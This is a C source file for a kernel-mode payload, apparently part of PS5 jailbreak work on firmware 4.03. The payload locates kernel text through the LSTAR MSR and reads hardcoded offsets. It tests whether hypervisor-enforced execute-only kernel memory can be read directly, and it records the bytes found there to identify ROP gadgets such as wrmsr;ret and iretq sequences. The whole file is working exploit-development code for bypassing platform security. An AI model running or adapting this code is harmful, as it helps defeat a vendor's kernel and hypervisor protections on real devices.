#include <stdint.h>

/*
 * ktext_verify — Enhanced ktext direct readability test
 *
 * Tests whether ktext is readable from ring 0 via direct virtual address
 * (NOT through DMAP). Previous tests only tried DMAP, which is blocked
 * by the hypervisor's NPT. Direct VA reads may have different NPT entries.
 *
 * Strategy: Read bytes from KNOWN ktext addresses where we can predict
 * the instruction encoding:
 *
 *   1. wrmsr_ret (kdata - 0x9d20cc): should be 0F 30 C3 (wrmsr; ret)
 *   2. nop_ret   (wrmsr_ret + 2):    should be C3 (ret)
 *   3. doreti_iret offset:            should contain CF (iretq)
 *   4. justreturn (kdata - 0x9cf990): should be C3 (ret) or near it
 *
 * We also read 8 bytes at each location to capture the surrounding
 * instruction context, useful for gadget identification.
 *
 * Output layout (uint64_t indices):
 *   [0]  magic "KTVR" (0x4B545652) | status(32)
 *   [1]  kdata_base
 *   [2]  ktext_base
 *   [3]  num_probes
 *
 *   For each probe (6 uint64s per probe):
 *   [base+0]  target_addr
 *   [base+1]  expected_byte | (actual_byte << 8) | (match << 16)
 *   [base+2]  raw 8 bytes at target (if readable)
 *   [base+3]  raw 8 bytes at target+8 (if readable)
 *   [base+4]  raw 8 bytes at target-8 (surrounding context)
 *   [base+5]  probe_status (1=ok, 0xDEAD=tried but bytes differ, 0=not tried)
 *
 *   [last-1] sentinel 0xdeadbeefcafe0021
 *   [last]   overall: total_readable count
 *
 * If this payload panics: ktext is execute-only for direct VA reads too.
 * If status stays 0xAAAA: the read faulted and killed the thread.
 * If status=1 and probes show correct bytes: KTEXT IS READABLE!
 */

#define MAGIC_KTVR       0x4B545652  /* "KTVR" */
#define NUM_PROBES       6
#define SLOTS_PER_PROBE  6
#define PROBE_BASE       4  /* output starts at index 4 */

/* FW 4.03 offsets from kdata_base (negative = ktext range) */
#define OFF_WRMSR_RET        (-0x9d20cc)
#define OFF_NOP_RET          (OFF_WRMSR_RET + 2)
#define OFF_DORETI_IRET      (-0x9cf84c)
#define OFF_JUSTRETURN       (-0x9cf990)
#define OFF_POP_ALL_IRET     (-0x9cf8ab)
#define OFF_REP_MOVSB        (-0x99002a)

typedef struct {
    uint64_t kdata_base;
    uint32_t fw_ver;
} kproc_args;

static inline uint64_t rdmsr(uint32_t msr)
{
    uint32_t lo, hi;
    __asm__ volatile("rdmsr" : "=a"(lo), "=d"(hi) : "c"(msr));
    return ((uint64_t)hi << 32) | lo;
}

/*
 * Try to read 8 bytes from addr. Returns 1 on success, 0 on failure.
 * On PS5, a faulting read in kernel mode may panic rather than return 0.
 * So if this function returns at all, the read succeeded.
 */
static uint64_t safe_read8(uint64_t addr)
{
    return *(volatile uint64_t*)addr;
}

static uint8_t safe_read1(uint64_t addr)
{
    return *(volatile uint8_t*)addr;
}

int module_start(kproc_args* args)
{
    uint64_t kdata_base = args->kdata_base;
    volatile uint64_t* out = (volatile uint64_t*)args;
    volatile uint32_t* out32 = (volatile uint32_t*)args;

    /* Zero output (use 280 slots, ~2240 bytes) */
    for (int i = 0; i < 280; i++)
        out[i] = 0;

    uint64_t lstar = rdmsr(0xC0000082);
    uint64_t ktext_base = lstar - 0x294218;

    /* Header */
    out32[0] = MAGIC_KTVR;
    out32[1] = 0xAAAA;  /* in-progress; will update on success */
    out[1] = kdata_base;
    out[2] = ktext_base;
    out[3] = NUM_PROBES;

    /*
     * Probe definitions: {offset_from_kdata, expected_first_byte, name}
     *
     * wrmsr = 0F 30, ret = C3
     * wrmsr; ret → 0F 30 C3
     * nop_ret → C3 (just the ret)
     * iretq → CF (or 48 CF for REX.W iretq)
     * justreturn → typically C3 (ret)
     * pop_all_iret → starts with pop sequence (41 5F = pop r15)
     * rep movsb = F3 A4
     */
    struct {
        int64_t offset;
        uint8_t expected;
    } probes[NUM_PROBES] = {
        { OFF_WRMSR_RET,    0x0F },  /* wrmsr opcode byte 1 */
        { OFF_NOP_RET,      0xC3 },  /* ret */
        { OFF_DORETI_IRET,  0x48 },  /* REX.W prefix for iretq (48 CF) */
        { OFF_JUSTRETURN,   0xC3 },  /* ret */
        { OFF_POP_ALL_IRET, 0x41 },  /* REX prefix for pop r15 (41 5F) */
        { OFF_REP_MOVSB,    0xF3 },  /* rep prefix */
    };

    int total_readable = 0;

    for (int i = 0; i < NUM_PROBES; i++) {
        int base = PROBE_BASE + i * SLOTS_PER_PROBE;
        uint64_t addr = kdata_base + probes[i].offset;

        out[base + 0] = addr;
        out[base + 1] = (uint64_t)probes[i].expected;
        out[base + 5] = 0;  /* not yet tried */

        /*
         * THE CRITICAL READ — if ktext is XO, this panics/faults.
         * We do each read individually so the output buffer shows
         * exactly how far we got before any crash.
         */
        uint8_t byte = safe_read1(addr);
        uint64_t raw0 = safe_read8(addr);
        uint64_t raw1 = safe_read8(addr + 8);
        uint64_t raw_before = safe_read8(addr - 8);

        out[base + 1] = (uint64_t)probes[i].expected
                       | ((uint64_t)byte << 8)
                       | ((uint64_t)(byte == probes[i].expected ? 1 : 0) << 16);
        out[base + 2] = raw0;
        out[base + 3] = raw1;
        out[base + 4] = raw_before;
        out[base + 5] = (byte == probes[i].expected) ? 1 : 0xDEAD;

        total_readable++;
    }

    /* Sentinel and summary */
    int sentinel_idx = PROBE_BASE + NUM_PROBES * SLOTS_PER_PROBE;
    out[sentinel_idx] = 0xdeadbeefcafe0021ULL;
    out[sentinel_idx + 1] = total_readable;

    /* Success: all probes completed without panic */
    out32[1] = 0x0001;

    return 0;
}
